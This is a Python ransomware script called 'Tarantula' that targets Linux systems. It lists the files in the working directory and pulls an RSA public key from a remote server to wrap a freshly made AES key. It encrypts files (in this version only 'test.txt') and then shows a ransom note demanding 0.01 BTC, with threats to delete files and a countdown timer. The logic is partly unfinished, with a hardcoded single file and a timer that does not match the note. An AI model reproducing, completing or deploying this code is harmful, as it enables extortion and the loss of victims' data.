# /usr/bin/python3
# ******************************************
# Script name: 'Tarantula'
# Usage: Ransomware
# Author: 'Armin A.'
# Target: Linux based systems
# ******************************************

import datetime
import json
from time import sleep
import os
from xmlrpc.client import DateTime
from libs import *
from libs.crypto import format_public_key, generate_aes_key, rsa_encrypt, aes_encrypt
from colorama import init, Fore, Back
from libs.cthread import CThread
import requests
from libs.server import *
init()

end_time = 0
files_to_exclude = ['tarantula', 'tarantula-decryptor', 'tarantula-service', 'encrypted-key.tarankey', 'file-list.taranfls']
files = os.listdir(".")
encryptKey = ""

# remove excluded files from list
for file in files_to_exclude:
    if file in files:
        files.remove(file)

# find all files of a directory
for file in files:
    if os.path.isdir(file):
        _dir = os.listdir(file)
        for _file in _dir:
            files.append(file + "/" + _file)
        files.remove(file)

def save_files_list():
    _files = ""
    for i in range(len(files)):
        _files += files[i] + "\n"
    with open("file-list.taranfls", "w+") as f:
        f.write(_files)

def change_console_colors():
    os.system("setterm -term linux -back white -fore red -clear")

def clear_console():
    os.system("clear")

def justified_message(message: str, limit: int):
    _message = ""
    for i in range(len(message)):
        if i % limit == 0:
            _message += "\n"
        _message += message[i]
    return _message[1:]

def get_server_public_key():
    try:
        response = requests.get(public_key_receive)
        _response = json.loads(response.text)
        return _response['public_key']
    except:
        return ""

def calculate_diff_time():
    while (True):
        if (datetime.datetime.now() > end_time):
            break
        diff_time = datetime.datetime(1, 1, 1) + (end_time - datetime.datetime.now())
        formated_end_time = datetime.datetime.strftime(diff_time, "%H:%M:%S")
        print(f"Remaining time: {formated_end_time}" + "\r", end="")
        sleep(1)
    print("\n" + "Time is up!")
    print(files)

def encrypt_files():
    file = "test.txt"
    file_content = open(file, "rb").read()
    encrypted = aes_encrypt(file_content, encryptKey.encode())
    with open(file, "wb") as f:
        f.write(encrypted)

# generate key (if not already generated)
if (os.path.exists("encrypted-key.tarankey") == False):
    aesKey = generate_aes_key(16)
    encryptKey = aesKey
    print(aesKey)
    serverPublicKey = format_public_key(get_server_public_key())
    print(serverPublicKey)
    encryptedKey = rsa_encrypt(aesKey, serverPublicKey)
    with open("encrypted-key.tarankey", "w") as f:
        f.write(encryptedKey.decode())

# save files list
save_files_list()

encrypt_files()

username = os.getlogin()
banner = """     /^\ ___ /^\\
    //^\(o o)/^\\
   /'<^~``~''~^>`\\\n"""
message = f"Hi {username}!, "
message += "I'm tarantula, a ransomware that loves you. I think you love me too. "
message += "I encrypted your files with my key. Also i encrypted my key and you can't decrypt your files. Listen; don't need to panic. I'll let you go if you be good boy. There are some explanations that if you read and act to them, you'll save from this pandemic. I promise my friend. I promise :)"
message = justified_message(message + "\n", 64)
message += "\n************ explanations ************\n"
message += "1. Never ever delete these files:\n"
message += "    - tarantula\n"
message += "    - tarantula-decryptor\n"
message += "    - tarantula-service\n"
message += "    - encrypted-key.tarankey\n\n"
message += "2. If you delete one of those files, I really can't help you anymore.\n"
message += "3. If you stop this program, or my services, I'll remove your files.\n"
message += "4. If you want to decrypt your files, you need to decrypt my key.\n"
message += "5. If you want to decrypt my key, you have to pay me 0.01 BTC.\n"
message += "6. After you pay, send your transaction ID to me using tarantula-decryptor.\n"
message += "7. REMEMBER: You have only 1 hour to pay, unless I can't help you.\n"
message += "8. GOVERNMENT ALERT: this program needs it's server. If you ban server\n   nothing changes.\n"
message += "\n**************************************\n"
message += "BTC Address: 1A1zP1eP5QGefi2DMPTfP5qqFmYvvoPk2n"
change_console_colors()
clear_console()
print("**************************************")
print(banner)
print("**************************************")
print(message)
started_time = datetime.datetime.now()
end_time = started_time + datetime.timedelta(seconds=10)
CThread(target=calculate_diff_time).start()